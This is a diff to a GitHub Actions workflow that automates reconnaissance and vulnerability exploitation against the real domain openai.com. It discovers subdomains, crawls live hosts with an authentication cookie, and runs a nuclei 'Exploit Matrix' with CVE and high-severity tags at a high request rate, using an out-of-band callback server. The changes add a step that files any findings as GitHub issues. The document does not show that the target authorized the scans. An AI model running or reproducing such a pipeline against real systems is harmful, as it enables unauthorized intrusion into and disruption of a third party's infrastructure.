@@ -7,6 +7,7 @@ on:
 
 permissions:
   contents: write
+  issues: write
 
 env:
   PDCP_API_KEY: ${{ secrets.PDCP_API_KEY }}
@@ -31,10 +32,6 @@ jobs:
           go install github.com/projectdiscovery/katana/cmd/katana@latest
           go install github.com/projectdiscovery/uncover/cmd/uncover@latest
           export PATH="$PATH:$GO_BIN"
-          subfinder -version
-          httpx -version
-          katana -version
-          uncover -version
 
       - name: Passive Discovery
         run: |
@@ -42,7 +39,7 @@ jobs:
           export PATH="$PATH:$GO_BIN"
           subfinder -d openai.com -all -silent -o subs.txt || true
 
-      - name: Cloud & Asset Discovery
+      - name: Cloud Discovery
         run: |
           GO_BIN=$(go env GOPATH)/bin
           export PATH="$PATH:$GO_BIN"
@@ -54,14 +51,13 @@ jobs:
           export PATH="$PATH:$GO_BIN"
           sort -u subs.txt | httpx -silent -o alive.txt || touch alive.txt
 
-      - name: Authenticated Deep Crawl
+      - name: Crawl
         run: |
           GO_BIN=$(go env GOPATH)/bin
           export PATH="$PATH:$GO_BIN"
-          katana -list alive.txt -jc -kf all -d 3 \
-            -H "Cookie: $AUTH_COOKIE" -o params_new.txt || touch params_new.txt
+          katana -list alive.txt -jc -kf all -d 3 -H "Cookie: $AUTH_COOKIE" -o params_new.txt || touch params_new.txt
 
-      - name: Normalize & Index Targets
+      - name: Normalize & Index
         run: |
           touch params.txt
           grep -vFf params.txt params_new.txt > to_scan.txt || cp params_new.txt to_scan.txt
@@ -94,37 +90,56 @@ jobs:
 
     steps:
       - uses: actions/checkout@v4
-
       - uses: actions/download-artifact@v4
         with:
           name: targets
 
-      - name: Install Nuclei Engine
+      - name: Install Nuclei
         run: |
           GO_BIN=$(go env GOPATH)/bin
           go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
           export PATH="$PATH:$GO_BIN"
-          nuclei -version
           nuclei -ut
 
       - name: Execute Exploit Matrix
+        shell: bash
         run: |
-          GO_BIN=$(go env GOPATH)/bin
+          set -euo pipefail
+          GO_BIN="$(go env GOPATH)/bin"
           export PATH="$PATH:$GO_BIN"
 
-          TARGET_FILE=$(ls buckets/bucket_* | sed -n "$((matrix.worker+1))p")
+          mapfile -t FILES < <(ls -1 buckets/bucket_* 2>/dev/null || true)
+          [ "${#FILES[@]}" -eq 0 ] && exit 0
+
+          IDX=${{ matrix.worker }}
+          [ "$IDX" -ge "${#FILES[@]}" ] && IDX=$((IDX % ${#FILES[@]}))
+          TARGET_FILE="${FILES[$IDX]}"
+
           [ -s "$TARGET_FILE" ] || exit 0
 
           nuclei -l "$TARGET_FILE" \
             -severity critical,high,medium \
-            -tags ${{ matrix.vuln }},cve,cve2025,cve2026 \
+            -tags ${{ matrix.vuln }},cve \
             -rate-limit 200 \
             -bulk-size 50 \
-            -resolvers https://raw.githubusercontent.com/projectdiscovery/dnsblast/main/resolvers.txt \
             -interactsh-server oast.fun \
             -H "Cookie: $AUTH_COOKIE" \
             -stats \
             -o results.txt || true
+
+      - name: 🚨 Create Alert if Vulnerability Found
+        if: always()
+        run: |
+          if [ -s results.txt ]; then
+            TITLE="🚨 ${{ matrix.vuln }} vulnerability found by worker ${{ matrix.worker }}"
+            BODY=$(sed 's/"/\\"/g' results.txt | head -n 40)
+
+            curl -X POST \
+              -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+              -H "Content-Type: application/json" \
+              https://api.github.com/repos/${{ github.repository }}/issues \
+              -d "{\"title\":\"$TITLE\",\"body\":\"\`\`\`\n$BODY\n\`\`\`\"}"
+          fi
 
       - name: Persist Intelligence
         run: |
